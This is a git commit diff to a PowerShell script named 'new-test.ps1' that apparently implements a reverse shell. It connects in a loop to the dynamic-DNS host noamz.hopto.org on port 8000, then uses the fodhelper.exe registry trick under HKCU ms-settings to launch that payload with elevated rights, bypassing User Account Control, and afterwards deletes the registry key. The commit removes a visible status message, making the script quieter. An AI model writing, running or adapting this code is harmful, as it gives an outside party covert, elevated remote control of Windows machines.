ab11ffd404e26e8117ec258e40ee4571943446a9
noamz1 <32007964+noamz1@users.noreply.github.com>
2017-10-27 07:02:27 +0300

    Update new-test.ps1

--- new-test.ps1
+++ new-test.ps1
@@ -1,9 +1,12 @@
-$clientz = { $address = 'noamz.hopto.org'
+$taktak = 
+{
+
+  $address = 'noamz.hopto.org'
 $port = 8000
 while ($true) {
     do {
         try {
-            Write-Host "Trying to reach "$address":"$port
+            
             $client = New-Object System.Net.Sockets.TcpClient($address, $port)  
             $stream = $client.GetStream()
             $writer = New-Object System.IO.StreamWriter($stream)
@@ -47,7 +50,7 @@ while ($true) {
 
 New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
 New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -w 1 -nop -noni -e $clientz" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell.exe $taktak" -Force
 Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 Start-Sleep 3
 Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
